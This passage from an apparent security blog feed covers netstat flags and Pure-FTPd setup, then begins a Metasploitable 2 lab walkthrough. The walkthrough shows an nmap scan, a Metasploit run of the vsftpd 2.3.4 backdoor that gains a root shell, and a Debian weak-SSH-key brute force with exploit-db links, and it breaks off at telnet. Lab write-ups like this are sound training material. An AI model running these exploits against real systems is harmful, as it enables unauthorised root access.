    <content type="html"><![CDATA[<p>Netstat is a very important tool for gathering information about the connections on a machine or troubleshooting network problems. It&rsquo;s a default utility for both Windows and Linux, thus there is no excuse in not getting familiar with it, it&rsquo;s very useful for any system admin, network guy or good old home user that would like to know what really is coming and going to and from his computer.</p>

<!-- more -->


<p>If ran with no arguments, netstat produses an overwhelming output of all the open sockets in the system. Here is its <em>man</em> page description:</p>

<blockquote><p>netstat  &ndash; Print network connections, routing tables, interface statistics,
masquerade connections, and multicast memberships</p></blockquote>

<p>Netstat is great when run with specific flags to zoom in on the information that is relevant to us. Here are some examples:</p>

<p><strong>Display the PID and the name of the program to which eack socket belongs, along with the path</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-p.png" title="netstat -p" alt="netstat --program"></p>

<p><strong>Display only listening sockets</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-l.png" title="netstat -l" alt="netstat --listening"></p>

<p><strong>Display all ports (both listening and non-listening</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-a.png" title="netstat -a" alt="netstat --all"></p>

<p><strong>Display listening sockets and established connections</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-ap.png" title="netstat -ap" alt="netstat -ap"></p>

<p><strong>Display TCP ports and connections</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-at.png" title="netstat -at" alt="netstat tcp"></p>

<p><strong>Display TCP statistics</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-st.png" title="netstat -st" alt="netstat stats"></p>

<p><strong>Display kernel routing tables</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-r.png" title="netstat -r" alt="netstat route"></p>

<p><strong>Display all TCP connections and listening ports using numeric values for addresses and ports, instead of resolving their names</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-antp.png" title="netstat -antp" alt="netstat antp"></p>

<blockquote><p>Q:    Why is Poland just like the United States?
A:    In the United States you can&rsquo;t buy anything for zlotys and in
  Poland you can&rsquo;t either, while in the U.S. you can get whatever
  you want for dollars, just as you can in Poland.
  &mdash; being told in Poland, 1987</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting Pure-FTPd up and running]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/09/getting-pure-ftpd-up-and-running/"/>
    <updated>2014-06-09T23:20:06+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/09/getting-pure-ftpd-up-and-running</id>
    <content type="html"><![CDATA[<p>In this tutorial I&rsquo;ll present the steps I took to set up Pure-FTPd on a Backtrack system. There might be slight differences for other distributions, particularly where file names and locations are concerned.</p>

<!-- more -->


<p>First, a brief description of Pure-FTPd, from the official documentation:</p>

<blockquote><p>Pure-FTPd is a fast, production-quality, standard-conformant FTP server, based upon
Troll-FTPd.</p>

<p>Features include chroot()ed and/or virtual chroot()ed home directories, virtual
domains, built-in &lsquo;ls&rsquo;, anti warez system, configurable ports for passive
downloads, FXP protocol, bandwidth throttling, ratios, LDAP / MySQL / PostgreSQL-
based authentication, fortune files, Apache-like log files, fast standalone mode,
text / HTML / XML real-time status report, virtual users, virtual quotas, privilege > separation, SSL/TLS and more.</p></blockquote>

<p>Something to keep in mind is that, unlike other FTP servers, Pure-FTPd is controlled through command line arguments, rather than a configuration file. The latter is possible, but I won&rsquo;t cover it here.</p>

<p>Before going into the commands, I want to explain the concept of <strong>virtual users</strong>. These are FTP-only accounts that don&rsquo;t have to exit on the system, since they&rsquo;re used only for FTP. They have to be associated with a system user, so a good practice which I&rsquo;ll follow here is to create a dedicated system account just for FTP. Thousands of virtual users can share the same system user, as long as they all are chrooted and they have their own home directory.</p>

<p>Now, on to getting the server ready to..serve. First, create a group for FTP activities:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd ftpgroup</span></code></pre></td></tr></table></div></figure>


<p>Now, create a system user that will be used for FTP only:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span></code></pre></td></tr></table></div></figure>


<p>The name of the user is ftpuser. The -g flag associates it with the previously created group. Since I don&rsquo;t want the user to have a home directory or a login shell for security reasons, the -d option nukes the home directory by assigning it to /dev/null, and -s option sets /etc as a  fake shell.</p>

<p>Next, make a directory for FTP users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ftpusers</span></code></pre></td></tr></table></div></figure>


<p>Now we want to create our first virtual user. First, make a home directory for that user (note that there is a switch to automate this, but I use the manual approach here):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ftpusers/testuser</span></code></pre></td></tr></table></div></figure>


<p>The <strong>pure-pw</strong> utility is what we&rsquo;ll use for managing virtual users. We could manually edit files instead, but who would want that when there&rsquo;s a nice, clean way?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pure-pw useradd testuser -u ftpuser -d /home/ftpusers/testuser</span></code></pre></td></tr></table></div></figure>


<p>This creates a virtual user named testuser, with the same UID as ftpuser, and that is chrooted to its home directory.</p>

<p>Next step is to commit all the virtual users changes to a PureDB file. Without committing changes to the database, the accounts won&rsquo;t be activated, and unusable.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pure-pw mkdb</span></code></pre></td></tr></table></div></figure>


<p>We then have to set up some symbolic links to add PureDB to the authentication methods:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ln -s /etc/pure-ftpd/pureftpd.passwd /etc/pureftpd.passwd
</span><span class='line'>ln -s /etc/pure-ftpd/pureftpd.pdb /etc/pureftpd.pdb
</span><span class='line'>ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/PureDB</span></code></pre></td></tr></table></div></figure>


<p>If you don&rsquo;t need Unix and PAM authentication, you can do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo no &gt; /etc/pure-ftpd/conf/UnixAuthentication
</span><span class='line'>echo no &gt; /etc/pure-ftpd/conf/PAMAuthentication</span></code></pre></td></tr></table></div></figure>


<p>Lastly, change the permissions of /home/ftpusers and its subdirectories to have ftpuser as owner and ftpgroup as group:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown -R ftpuser /home/ftpusers
</span><span class='line'>chgrp -R ftpgroup /home/ftpusers</span></code></pre></td></tr></table></div></figure>


<p>From here on there are a lot of options which you can use to customize your FTP server to suit your needs. As always, a good place to start looking for more advanced options is in the man pages and official documentation.</p>

<p>Cookie:</p>

<blockquote><p>You don&rsquo;t become a failure until you&rsquo;re satisfied with being one.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Metasploitable 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/"/>
    <updated>2014-06-03T21:16:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through different ways of exploiting Metasploitable 2, the newer release of Rapid7&rsquo;s popular vulnerable machine. First, what is Metasploitable?</p>

<!-- more -->


<blockquote><p>Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be
used to conduct security training, test security tools, and practice common
penetration testing techniques.</p></blockquote>

<p>In my lab environment, the IP of the attacker machine is 192.168.127.159, and the victim machine is 192.168.127.154.</p>

<p>Since this is a test lab, I won&rsquo;t be concerned about stealth. Instead, I will try to get the most information out of the scans.</p>

<p>Let&rsquo;s start by port scanning the target with nmap. I did a full port, aggresive scan against the target. Here are the results.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p1-65535 -A 192.168.127.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-03 21:33 EEST
</span><span class='line'>Nmap scan report for 192.168.127.154
</span><span class='line'>Host is up (0.00047s latency).
</span><span class='line'>Not shown: 65505 closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>21/tcp    open  ftp         vsftpd 2.3.4
</span><span class='line'>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
</span><span class='line'>|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
</span><span class='line'>23/tcp    open  telnet      Linux telnetd
</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
</span><span class='line'>|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Not valid before: 2010-03-17T14:07:45+00:00
</span><span class='line'>|_Not valid after:  2010-04-16T13:07:45+00:00
</span><span class='line'>|_ssl-date: 2014-06-03T18:35:26+00:00; -1s from local time.
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.4.2
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.4.2
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Metasploitable2 - Linux
</span><span class='line'>111/tcp   open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>512/tcp   open  exec        netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login?
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>1099/tcp  open  java-rmi    Java RMI Registry
</span><span class='line'>1524/tcp  open  shell       Metasploitable root shell
</span><span class='line'>2049/tcp  open  nfs         2-4 (RPC #100003)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>2121/tcp  open  ftp         ProFTPD 1.3.1
</span><span class='line'>3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 53
</span><span class='line'>|   Version: .0.51a-3ubuntu5
</span><span class='line'>|   Thread ID: 8
</span><span class='line'>|   Capabilities flags: 43564
</span><span class='line'>|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|_  Salt: (eFoz:O^m'yLR5Qw&RJ\
</span><span class='line'>3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</span><span class='line'>5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>5900/tcp  open  vnc         VNC (protocol 3.3)
</span><span class='line'>| vnc-info: 
</span><span class='line'>|   Protocol version: 3.3
</span><span class='line'>|   Security types: 
</span><span class='line'>|_    Unknown security type (33554432)
</span><span class='line'>6000/tcp  open  X11         (access denied)
</span><span class='line'>6667/tcp  open  irc         Unreal ircd
</span><span class='line'>| irc-info: 
</span><span class='line'>|   server: irc.Metasploitable.LAN
</span><span class='line'>|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
</span><span class='line'>|   servers: 1
</span><span class='line'>|   users: 1
</span><span class='line'>|   lservers: 0
</span><span class='line'>|   lusers: 1
</span><span class='line'>|   uptime: 0 days, 0:07:28
</span><span class='line'>|   source host: 7FA0EA81.B1DFC955.FFFA6D49.IP
</span><span class='line'>|_  source ident: nmap
</span><span class='line'>6697/tcp  open  irc         Unreal ircd
</span><span class='line'>8009/tcp  open  ajp13?
</span><span class='line'>| ajp-auth: 
</span><span class='line'>|_  ERROR: Failed to connect to AJP server
</span><span class='line'>| ajp-methods: 
</span><span class='line'>|_  ERROR: Failed to connect to server
</span><span class='line'>8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
</span><span class='line'>34130/tcp open  status      1 (RPC #100024)
</span><span class='line'>46385/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>50867/tcp open  unknown
</span><span class='line'>53013/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>MAC Address: 00:0C:29:2E:6D:70 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.20-Debian)
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Workgroup: WORKGROUP
</span><span class='line'>|_  System time: 2014-06-03T14:35:26-04:00
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.47 ms 192.168.127.154
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 284.64 seconds</span></code></pre></td></tr></table></div></figure>


<p>Ok, there are plenty of services just waiting for our attention. So let&rsquo;s check each port and see what we get.</p>

<h3>Port 21 vsftpd</h3>

<p>There is an exploit available in Metasploit for the vsftpd version.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; search vsftpd
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                  Disclosure Date  Rank       Description
</span><span class='line'>   ----                                  ---------------  ----       -----------
</span><span class='line'>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution</span></code></pre></td></tr></table></div></figure>


<p>The description from Rapid7 site:</p>

<p><strong>VSFTPD v2.3.4 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the
vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was
removed on July 3rd 2011.</p></blockquote>

<p>Let&rsquo;s leverage it and get a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name               Disclosure Date  Rank    Description
</span><span class='line'>   ----               ---------------  ----    -----------
</span><span class='line'>   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set payload cmd/unix/interact
</span><span class='line'>payload =&gt; cmd/unix/interact
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/interact):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Banner: 220 (vsFTPd 2.3.4)
</span><span class='line'>[*] USER: 331 Please specify the password.
</span><span class='line'>[+] Backdoor service has been spawned, handling...
</span><span class='line'>[+] UID: uid=0(root) gid=0(root)
</span><span class='line'>[*] Found shell.
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:57936 -&gt; 192.168.127.154:6200) at 2014-06-03 22:42:36 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>uname -a
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Aaand we own the machine! Now let&rsquo;s move on.</p>

<h3>Port 22 ssh</h3>

<p>The OpenSSL package installed on the system is vulnerable to a bruteforce exploit  due to a random number generator weakness. Here&rsquo;s the overview and the CVE number:</p>

<p><strong>CVE-2008-0166</strong></p>

<blockquote><p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable > numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p></blockquote>

<p>I chose the following Ruby exploit:</p>

<p><a href="http://www.exploit-db.com/exploits/5632/">http://www.exploit-db.com/exploits/5632/</a></p>

<p>Before running it, you have to download the precalculated vulnerable keys from:</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2</a>  # for dsa keys</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a> # for rsa keys</p>

<p>Then I ran the script as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby ./5632.rb 192.168.127.154 root ~/rsa/2048/</span></code></pre></td></tr></table></div></figure>


<p>You can consult the source for more information, basically this checks if the root account has a weak SSH key, testing each key in the directory where you placed the keys. Upon a hit, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>KEYFILE FOUND:
</span><span class='line'>
</span><span class='line'>57c3115d77c56390332dc5c49978627a-5429</span></code></pre></td></tr></table></div></figure>


<p>After finding the key, you can use it to log in as root via ssh:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -l root -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.127.154</span></code></pre></td></tr></table></div></figure>


<h3>Port 23 telnet</h3>

<p>For this one I used an auxiliary module:</p>

